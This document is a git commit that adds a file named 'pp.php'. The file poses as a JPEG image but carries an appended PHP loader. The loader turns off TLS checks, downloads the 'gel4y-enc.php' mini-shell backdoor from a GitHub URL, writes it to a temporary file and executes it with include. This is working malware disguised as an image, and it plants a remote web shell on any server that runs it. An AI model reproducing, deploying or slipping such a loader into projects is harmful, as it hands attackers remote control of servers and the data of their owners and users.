2f6e86770792fa104610ceafa6e23cd2b8bec03e
masjayy5 <masjay2022@gmail.com>
2026-03-04 04:19:13 +0700

    Add files via upload

---
+++ pp.php
@@ -0,0 +1,98 @@
+����JFIF���H�H�����C�	
+
+			
+
+		
+
+
+���C	�������"���������������	
+���?������!1A	"2Qaq�#3Bb$5Cs����Rrt��������������������������������!AQ1�����?��:R�
+R�
+R�
+R�
+R�
+R�
+R�
+R�
+R�
+R�
+R�
+R�
+R���q��l����s�]l9��
+��I�8�$%����ds��#���w�k���_�OK]5T������[��K��>�&��{f�w����n�D�S�����p��	L�y�R�mIW���[GO=��pÖ��4;�oruEǟ�L)iK>�`!$y֯櫩�K���}�{Q�:�Z��E �L+#��B#XH��m��x2��tpO"�m��o)_�R����b�1�Z�J�X"����ԣ�$��O�};��TK���ac�6���G��NZ�ߞ�r��W�x��i�jS�\���U�o;M��~����u�q��B�����)ZI}�i�e[X��}��%�ۜ�[�X���?>���������T��m]�f�Ӫ�E�adr?vV�:>A�]����)�v�sPk�n��FTƗ�SOdc�-��`�"��-	R��pR�Ԡ	��o�V�y��v���~��m��_�.#�u��=�д��Y�]��*)JR�JR�JR�JV������l�YyZKod5*�`���K�ԅ+�X�&�
+���	G �4�����\4��E4V�r-VȺY��G�)QI -�$)HA!)H.8B�
+�[f��O'�W��8���5�S�2X��{��_w]��ˤ������g��N��v㩹�T�O����|�<.���$)����lp�YU�\D�)J�K���ӥ54v��<��6��T�(���I'ʢ�4��>�}�&�i�!^3�l,����K���C�x��fҴ�Bk�Y��X��Ҍ�D�p�@`]����|�C#��eU�����_�ۏ��@z^��m̕!S-�Ty�A���_���i�A>J5�*+�j>�`�����u�z���}�K�q��y��E��>u&���f�f����k��١����⒐=�ğuI	i�:T�J��V'$�,Y}���֦.V��uęJ�y��?��1VTӫ���Ƣ�����t�]�L���=���A��RO$@"��ʫ�K��?��924�Q$�#�!EB��-��]�)Qm��SO�WV{�Y��iJT
+R�
+R�
+��Tt�#~���V�h��h���nH)����$�œ�J���W�L
+Ϟ���*P�vK�0г�W+�!�����h��f���
+ی|�qS�<��"�!��V��C�~E-?�u:����eJR����oh^�n���\tK�:����k����w� ���;�YP�	�-*Q����3�_�6���*rR|�i�,����oL��*�)re��Y��u�wZ�R�'�kxM��U��)]XeqL�%�rK~c�ޤZ/v�|xSX>�K��=��	
+J�J� �
+]^ֵ��t�۝6�q.̭V����k`u��"�R�?�`��G�<���3mF���T)��$�~<Ӯ�������?*�s���Yu)J��CoCB#��^l1a�r*x��+�F[HW,��è+h���^ic6!��kv��R����b���o��]u�Ц�P�wq���8��i Hʁ�pfN��U�a���Wr;s}_��HB�@&Z>� |�����<iJTR����S���.�6�yi�T�].��D��uc�K*�n��cM���X��N+j��|ԴEl)G�T	?SQ�ڭ�;Z�Y��%��>Jm���MJ-8���O1{�U��*�	�� �L ����;zZR�ѼZ��-���U�ȯ$z��JT?Ț�����Mu�rD�u�f9l�J::�h�z%`��T+�6�N��K;X]^��4V?\��[����(OZTGJAQ	ZBRH�I��uY�mV�����w���,�m��]2 �alHh�p����+�HH*Q�2k�j�=��uq�;ՙ���J�b�����V��q�}kh���jv��1���>%��K0���1����'���d�
+8�[K0�>�ۄ+=�8��5+�*qg���-J�R���yޚ�v�ԥ+�eAM�6�C�I���.�h�-h����,�ɍ�~����N���O��m��C�bX���&4��0����N�R��)@�)Aw��j�=F��/�0�D���mg��d�U����cM��%/�n�1e}`�|XC�����<��nŦ��:�t���\c;CJ���JV�>D*�;o�4�6���.�����M��X><P�2��H��g�*<r��;N�R���z���MjM�R3{F=}�3d�-�����{$������r�H�[�l���u$[)!*)=�|�\�sҎ�|�p�&S�d��NS����zl狮��	씏D�� o6��K�}�l�,����a�R���"����\š���BkVc��ح������$��@�K-�~ ������P������\Ɩo�l��[
+�7c��K1�����ԣ�!���*>�)_'�T�m��m.���IRO ��A��%%**��؃�Rm���-�ΏkT�6����Q�a��|y�ڼ�O=C7e��)^CK�C	�L*ߟ���l�����8Ӊ<-�P{�ī�R�O��m��%�O������֝b�N�'���۪R��=wVR~�T��r�>�^3,�Rc[,p_�Ku_��H+Q����}����5�jf�2�n�p�o�ƃ��#%���qi`�|�MY�jT�)QJR�
+R�
+�[�2�$�\Kz�_��c�#��⴮�0T�8��RV��P��*�ϑ9k{��rK4�r�ob}���s"����eĔ�
+���~�e�Y�L�՜Ϩx|��Z�Q��D�[j�[K´,)
+�&������t�r1��F_�8�m�,ux*���4���Z���~i��շ�T\o��M.�}	.;i|���%O!)R�m	RyZ��߶�曄���7��;,G�ݢK�S
+YZ�D)���B��i=<�RRM��[K[������<�:뮬��\Q*R֥rT�(�TI$�Os\W*J��6���EB�R�� ��*⻹��(�($>�!3@5b4���+-��+�n(�Ep�&���E)Y�d�f�.`*�4Koړ�l��[���B����BT�V���\㺸祴�z�9P���nm��i�=������V$["�� ���_JZL�
+6Q��>n+��B�9�7xo���R���.�'T��!��K'�B�ZZs��J�89祴'�\���`Ҽ��X�+M���
+�+p!<)œ浫�(��Z#e�Z�����ꌅ�uC2�v��îBm�,vRԿ}է�P�{�I2~�|�=sJR���(�(�(0��j&1?
+�,q��k�~���T<��*�
+HEA��nK`w��>��f�i$�
+�7��0B�*YCi%��J����z��iV]&�&L=�o�?�a��j<�˜)�W7֞9�B�����Rz�|�>Z#R��ۇ�d��l���#��C��I���/��s߰����
+�
+m~E�E��S!��}w||7ǝp��Rӧ�����%��q���D���cpp3+a^�"��u�R�HK��~�$��2�5��Z�8��D�t[;��|Nv[�~O6ښ?��a�ӭH��L�)N�Ǉ��t��ҬU��{Iq�3
+��r�xKֆ�AX��S������w��K�T{f���W%39��m�����}��C,'f��V��z?z����E�؄���K��A�/��6�M;��:�V�[!�aL|�<q��ǂ\X�iiD�9#��J�{U55���`�tӣ��6���R���r>a�]�{ٿq�.����M�Oi~)�S��G+�N%�fC��T�0�ڽxKx�ziQp��
+�1kA��wS͡@%<��_��
+�d�T�w�v]hљ�j~���\�B�H�v��>�'8X��Z�Ge<�|��!>�o�M0
++��ӜFُ[����qd�V�yŒ{�D��k��w�Z)JTR����������������������������������������������<?php
+// Enable error reporting for debugging purposes
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        $url_get_contents_data = curl_exec($conn);
+        if (curl_errno($conn)) {
+            echo 'Curl error: ' . curl_error($conn);
+            return false;
+        }
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+        if ($url_get_contents_data === false) {
+            echo 'file_get_contents error';
+            return false;
+        }
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        if ($handle === false) {
+            echo 'fopen error';
+            return false;
+        }
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+// Directly execute the main content
+    $a = geturlsinfo('https://raw.githubusercontent.com/AabyssZG/Gel4y-Mini-Shell-Backdoor-Decode/refs/heads/main/gel4y-enc.php');
+if ($a !== false) {
+    $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
+    file_put_contents($tmp_file, $a);
+    include($tmp_file);
+    // Do not delete the temporary file
+} else {
+    echo "Failed to retrieve content.";
+}
+?>
